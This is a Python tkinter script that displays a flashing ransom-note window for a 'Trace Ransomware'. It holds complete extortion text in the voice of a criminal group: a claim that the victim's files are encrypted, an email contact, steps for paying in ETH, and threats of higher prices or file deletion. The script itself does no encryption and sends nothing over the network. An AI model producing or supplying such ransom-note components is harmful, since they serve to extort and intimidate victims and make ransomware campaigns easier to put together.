from tkinter import *
from tkinter import ttk
from PIL import Image, ImageTk
import subprocess


def change_color():
    current_color = root.cget("background")
    next_color = "blue" if current_color == "red" else "red"
    root.config(background=next_color)
    root.after(1000, change_color)


root = Tk()
root.iconbitmap("malware.ico")
root.title ('Trace_RansomWare_Note')
canvas = Canvas(root, width = 720, height = 150)

images = Image.open("trace.png")
# img = image.resize((300,200))

canvas.pack(fill = BOTH, expand = True)
resized_image = images.resize((200,60), Image.Resampling.LANCZOS)
photo = ImageTk.PhotoImage(resized_image)
canvas.create_image(210, 65, anchor="se", image=photo)
canvas.create_text(265, 110, text = 'Trace-Ransomware', font = ('Helvetica', 36, 'bold'), justify = 'center', fill='black')


text = Text(root)
text.insert(INSERT, """Dear User...

Congratulations, your harddisk had been compromised with new type ransomware named 'Trace Ransomware'. This ransomware will encrypt some of your file using an Military grade encryption algorithm.

There is no way to restore your data without a special key.
Only we can decrypt your files!

To purchase your key and restore your data, please follow these  easy steps:

1. Email the file called EMAIL_ME.txt at {self.sysRoot}/Desktop/
EMAIL_ME.txt to traceoffenseteam@cyber17.com

2. You will recieve your personal ETH address for payment.
Once payment has been completed, send another email to
traceoffenseteam@cyber17.com stating "PAID".
We will check to see if payment has been paid.

3. You will receive a text file with your KEY that will unlock all your files. 

IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly  after it will begin to decrypt all files.

WARNING:
Do NOT attempt to decrypt your files with any software as it is obselete and 
will not work, and may cost you more to unlcok your files.

Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files--and there is a high chance you will lose your files forever.

Do NOT send "PAID" button without paying, price WILL go up for disobedience.

Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL!!!\n\n""")
text.insert(END, "Have a Nice Day......")
text.pack()

canvas.update

panewindow = ttk.Panedwindow(root, orient = VERTICAL)
panewindow.pack(fill = BOTH, expand = True)

prescription_frame = ttk.Frame(panewindow, width = 1600, height = 300, relief = RAISED)
prescription_label1 = Label(prescription_frame, text="Trace Offensive Team")
prescription_label1.pack()
prescription_label2 = Label(prescription_frame, text="~ BHAHR ~")
prescription_label2.pack()

panewindow.add(prescription_frame, weight = 1)


change_color()
root.mainloop()
